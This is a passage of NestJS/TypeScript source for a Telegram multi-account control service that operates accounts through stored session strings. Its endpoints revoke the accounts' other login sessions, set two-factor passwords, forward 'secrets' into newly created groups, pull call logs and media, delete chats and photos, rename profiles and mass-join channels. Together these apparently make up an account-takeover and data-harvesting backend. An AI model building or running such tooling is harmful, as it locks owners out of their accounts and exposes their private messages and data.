@ApiQuery({ name: 'url', description: 'url ID of user', required: true })\r\n    async sendInlineMessage(@Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('message') message: string,\r\n        @Query('url') url: string,) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.sendInlineMessage(mobile, chatId, message, url);\r\n    }\r\n\r\n    @Get('lastActiveTime/:mobile')\r\n    @ApiOperation({ summary: 'Get Last Active time of a user' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    async lastActiveTime(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getLastActiveTime(mobile);\r\n    }\r\n\r\n    @Post('joinchannels/:mobile')\r\n    @ApiOperation({ summary: 'Join channels' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiBody({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } })\r\n    //@apiresponse({ status: 200, description: 'Channels joined successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannels(@Param('mobile') mobile: string, @Body('channels') channels: string) {\r\n        await this.connectToTelegram(mobile);\r\n        // this.telegramService.joinChannels(mobile, channels);\r\n        return 'Joining Channels';\r\n    }\r\n\r\n    @Get('removeauths/:mobile')\r\n    @ApiOperation({ summary: 'Remove other authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations removed successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async removeOtherAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.removeOtherAuths(mobile);\r\n        return 'Authorizations removed successfully';\r\n    }\r\n\r\n    @Get('selfmsgsinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getSelfMsgsInfo(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getSelfMsgsInfo(mobile);\r\n    }\r\n\r\n    @Get('createGroup/:mobile')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async createGroup(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createGroup(mobile);\r\n    }\r\n\r\n    @Get('forwardSecrets/:mobile/:fromId')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async forwardSecrets(@Param('mobile') mobile: string, @Param('fromId') fromId: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardSecrets(mobile, fromId);\r\n    }\r\n\r\n    @Get('joinChannelAndForward/:mobile/:fromId/:channel')\r\n    @ApiOperation({ summary: 'Get self messages info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async joinChannelAndForward(@Param('mobile') mobile: string, @Param('fromId') fromId: string, @Param('channel') channel: string) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return await this.telegramService.joinChannelAndForward(mobile, fromId, channel);\r\n    }\r\n    @Get('leaveChannel/:mobile/:channel')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannel(@Param('mobile') mobile: string, @Param('channel') channel: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannel(mobile, channel);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('getCallLog/:mobile')\r\n    @ApiOperation({ summary: 'Get CallLog  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getCallLog(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getCallLog(mobile);\r\n    }\r\n\r\n    @Get('getMe/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMe(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getMe(mobile);\r\n    }\r\n\r\n    @Get('getMedia/:mobile')\r\n    @ApiOperation({ summary: 'Get me  info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMedia(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getmedia(mobile);\r\n    }\r\n\r\n    @Get('channelinfo/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'sendIds', description: 'Whether to send IDs or not', required: false })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChannelInfo(@Param('mobile') mobile: string, @Query('sendIds') sendIds: boolean = false) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChannelInfo(mobile, sendIds);\r\n    }\r\n\r\n    @Get('leaveChannels/:mobile')\r\n    @ApiOperation({ summary: 'Get channel info' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async leaveChannels(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        this.telegramService.leaveChannels(mobile);\r\n        return \"Started Leaving Channels\"\r\n    }\r\n\r\n    @Get('auths/:mobile')\r\n    @ApiOperation({ summary: 'Get authorizations' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: 'Authorizations fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getAuths(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getAuths(mobile);\r\n    }\r\n\r\n    @Get('set2Fa/:mobile')\r\n    @ApiOperation({ summary: 'Set 2Fa' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 200, description: '2Fa set successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async set2Fa(@Param('mobile') mobile: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.set2Fa(mobile);\r\n    }\r\n\r\n    @Get('setprofilepic/:mobile/:name')\r\n    @ApiOperation({ summary: 'Set Profile Picture' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'name', description: 'Profile name', type: String })\r\n    async setProfilePic(\r\n        @Param('mobile') mobile: string,\r\n        @Param('name') name: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.setProfilePic(mobile, name)\r\n    }\r\n\r\n    @Get('updatePrivacy/:mobile')\r\n    @ApiOperation({ summary: 'Update Privacy Settings' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async updatePrivacy(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updatePrivacy(mobile)\r\n    }\r\n\r\n    @Get('UpdateUsername/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String, required: false })\r\n    async updateUsername(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateUsername(mobile, username)\r\n    }\r\n\r\n    @Get('getGrpMembers/:mobile')\r\n    @ApiOperation({ summary: 'Update Username' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'username', description: 'New username', type: String })\r\n    async getGrpMembers(\r\n        @Param('mobile') mobile: string,\r\n        @Query('username') username: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getGrpMembers(mobile, username)\r\n    }\r\n\r\n    \r\n\r\n    @Post('addcontact')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContact(@Body() addContactDto: AddContactDto) {\r\n        const { mobile, data, prefix } = addContactDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContact(mobile, data, prefix);\r\n    }\r\n\r\n\r\n    @Post('addcontacts')\r\n    @ApiOperation({ summary: 'Add multiple contacts' })\r\n    @ApiBody({\r\n        description: 'Add contacts with a phone number array and a prefix for names',\r\n        type: AddContactsDto\r\n    })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Successfully added contacts.',\r\n        schema: {\r\n            example: {\r\n                success: true,\r\n                addedContacts: 5,\r\n            },\r\n        },\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Error adding contacts.',\r\n        schema: {\r\n            example: {\r\n                success: false,\r\n                error: 'Error message',\r\n            },\r\n        },\r\n    })\r\n    async addContacts(@Body() addContactsDto: AddContactsDto) {\r\n        const { mobile, phoneNumbers, prefix } = addContactsDto;\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.addContacts(mobile, phoneNumbers, prefix);\r\n    }\r\n\r\n    @Get('newSession/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async newSession(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.createNewSession(mobile)\r\n    }\r\n\r\n    @Get('updateNameandBio/:mobile')\r\n    @ApiOperation({ summary: 'Update Name' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiQuery({ name: 'firstName', description: 'First Name', type: String })\r\n    @ApiQuery({ name: 'about', description: 'About', type: String })\r\n    async updateName(\r\n        @Param('mobile') mobile: string,\r\n        @Query('firstName') firstName: string,\r\n        @Query('about') about: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.updateNameandBio(mobile, firstName, about)\r\n    }\r\n\r\n    @Get('metadata')\r\n    async getMediaMetadata(@Query('mobile') mobile: string, @Query('chatId') chatId: string, @Query('offset') offset: number, @Query('limit') limit: number) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\r\n    }\r\n\r\n    @Get('download')\r\n    async downloadMediaFile(\r\n        @Query('mobile') mobile: string,\r\n        @Query('messageId') messageId: number,\r\n        @Query('chatId') chatId: string,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        await this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\r\n    }\r\n\r\n    @Get('downloadProfilePic')\r\n    async downloadProfilePic(\r\n        @Query('mobile') mobile: string,\r\n        @Query('index') index: number,\r\n        @Res() res: any\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        try {\r\n            const filePath = await this.telegramService.downloadProfilePic(mobile, index);\r\n            if (!filePath) {\r\n                return res.status(404).send('Profile photo not found.');\r\n            }\r\n\r\n            res.download(filePath, 'profile_pic.jpg', (err) => {\r\n                if (err) {\r\n                    console.error('Error sending the file:', err);\r\n                    res.status(500).send('Error downloading the file.');\r\n                }\r\n\r\n                fs.unlink(filePath, (err) => {\r\n                    if (err) {\r\n                        console.error('Error deleting the file:', err);\r\n                    }\r\n                });\r\n            });\r\n        } catch (error) {\r\n            console.error('Error in endpoint:', error);\r\n            res.status(500).send('An error occurred.');\r\n        }\r\n    }\r\n\r\n\r\n    @Get('forward/:mobile/:chatId/:messageId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    @ApiParam({ name: 'messageId', description: 'messageId of message', type: String })\r\n    async forrward(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n        @Param('messageId') messageId: number,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.forwardMessage(mobile, chatId, messageId)\r\n    }\r\n\r\n    @Get('deleteChat/:mobile/:chatId')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\r\n    async deleteChat(\r\n        @Param('mobile') mobile: string,\r\n        @Param('chatId') chatId: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteChat(mobile, chatId)\r\n    }\r\n\r\n    @Get('deleteProfilePics/:mobile')\r\n    @ApiOperation({ summary: 'Create new session' })\r\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n    async deleteProfilePics(\r\n        @Param('mobile') mobile: string,\r\n    ) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.deleteProfilePhotos(mobile)\r\n    }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { TelegramService } from './Telegram.service';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)],\n    controllers: [TelegramController],\n    providers: [TelegramService],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\nimport { UsersService } from '../users/users.service';\nimport { contains, parseError, sleep } from \"../../utils\";\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { Api, TelegramClient } from 'telegram';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private static clientsMap: Map<string, TelegramManager> = new Map();\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {}\n\n    async onModuleDestroy() {\n        await this.disconnectAll();\n    }\n\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    public async getClient(number: string) {\n        const client = TelegramService.clientsMap.get(number);\n        try {\n            if (client && client.connected()) {\n                await client.connect()\n                return client\n            }\n        } catch (error) {\n            console.log(error)\n        }\n        return undefined;\n    }\n\n    public hasClient(number: string) {\n        return TelegramService.clientsMap.has(number);\n    }\n\n    async deleteClient(number: string) {\n        const cli = await this.getClient(number);\n        await cli?.disconnect();\n        console.log(\"Disconnected : \", number)\n        return TelegramService.clientsMap.delete(number);\n    }\n\n    async disconnectAll() {\n        const data = TelegramService.clientsMap.entries();\n        console.log(\"Disconnecting All Clients\");\n        for (const [phoneNumber, client] of data) {\n            try {\n                await client?.disconnect();\n                TelegramService.clientsMap.delete(phoneNumber);\n                console.log(`Client disconnected: ${phoneNumber}`);\n            } catch (error) {\n                console.log(parseError(error));\n                console.log(`Failed to Disconnect : ${phoneNumber}`);\n            }\n        }\n        TelegramService.clientsMap.clear();\n        // this.bufferClientService.clearBufferMap()\n        this.bufferClientService.clearJoinChannelInterval()\n    }\n\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        if (!this.hasClient(mobile)) {\n            let telegramManager = new TelegramManager(user.session, user.mobile);\n            let client: TelegramClient\n            try {\n                client = await telegramManager.createClient(handler);\n                await client.getMe();\n                if (client) {\n                    TelegramService.clientsMap.set(mobile, telegramManager);\n                    if (autoDisconnect) {\n                        setTimeout(async () => {\n                            if (client.connected || await this.getClient(mobile)) {\n                                console.log(\"SELF destroy client : \", mobile);\n                                await telegramManager.disconnect();\n                            } else {\n                                console.log(\"Client Already Disconnected : \", mobile);\n                            }\n                            TelegramService.clientsMap.delete(mobile);\n                        }, 180000)\n                    } else {\n                        setInterval(async () => {\n                            //console.log(\"destroying loop :\", mobile)\n                            //client._destroyed = true\n                            // if (!client.connected) {\n                            // await client.connect();\n                            //}\n                        }, 20000);\n                    }\n                    return telegramManager;\n                } else {\n                    throw new BadRequestException('Client Expired');\n                }\n            } catch (error) {\n                console.log(\"Parsing Error\");\n                if (telegramManager) {\n                    await telegramManager.disconnect();\n                    telegramManager = null;\n                    TelegramService.clientsMap.delete(mobile);\n                }\n                const errorDetails = parseError(error);\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                    console.log(\"Deleting User: \", user.mobile);\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\n                } else {\n                    console.log('Not Deleting user');\n                }\n                throw new BadRequestException(errorDetails.message)\n            }\n        } else {\n            console.log(\"Client Already exists\")\n            return await this.getClient(mobile)\n        }\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    // async joinChannels(mobile: string, channels: Channel[]) {\n    //     console.log(\"Started Joining- \", mobile, \" - channelsLen - \", channels.length);\n\n    //     const joinChannelWithDelay = async (index: number) => {\n    //         const telegramClient = await this.createClient(mobile, false, false)\n    //         if (index >= channels.length) {\n    //             console.log(mobile, \" - finished joining channels\");\n    //             await this.deleteClient(mobile);\n    //             console.log(\"Join channel stopped : \", mobile);\n    //             return;\n    //         }\n\n    //         console.log(mobile, \" - Will Try next now\");\n    //         const channel = channels[index]\n    //         const username = channel.username;\n    //         console.log(mobile, \"Trying: \", username);\n    //         try {\n    //             await tryJoiningChannel(telegramClient, channel, username, mobile);\n    //         } catch (error) {\n    //             parseError(error, \"Outer Err: \");\n    //             await this.removeChannels(error, channel.channelId, channel.username);\n    //         }\n    //         console.log(mobile, \" - On waiting period\");\n    //         await this.deleteClient(mobile)\n    //         this.joinChannelTimeoutId = setTimeout(async () => {\n    //             joinChannelWithDelay(index + 1);\n    //         }, 3 * 60 * 1000);\n    //     };\n\n\n\n    //     joinChannelWithDelay(0);\n    //     return 'Channels joining in progress';\n    // }\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.removeOtherAuths();\n        return 'Authorizations removed successfully';\n    }\n\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardSecrets(mobile: string, fromChatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroupAndForward(fromChatId);\n    }\n\n\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\n    }\n\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false) {\n        const telegramClient = await this.getClient(mobile)\n        const result = await telegramClient.getDialogs({ limit: 10, archived: false })\n        // console.log(result)\n        return await telegramClient.channelInfo(sendIds);\n    }\n\n    async getAuths(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getAuths();\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            await telegramClient.disconnect();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await telegramClient.disconnect();\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string, chatId: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMetadata(chatId, offset, limit);\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, chatId: string, messageId: number) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.forwardMessage(chatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        return await telegramClient.leaveChannels(leaveChannelIds);\n    }\n\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.leaveChannels([channel]);\n    }\n\n\n    async deleteChat(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.deleteChat(chatId);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updateProfile(firstName, about)\n            return \"Username updated successfully\";\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n}\n","import { TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport { Api } from 'telegram/tl';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { contains, fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { Dialog } from 'telegram/tl/custom/dialog';\nimport { 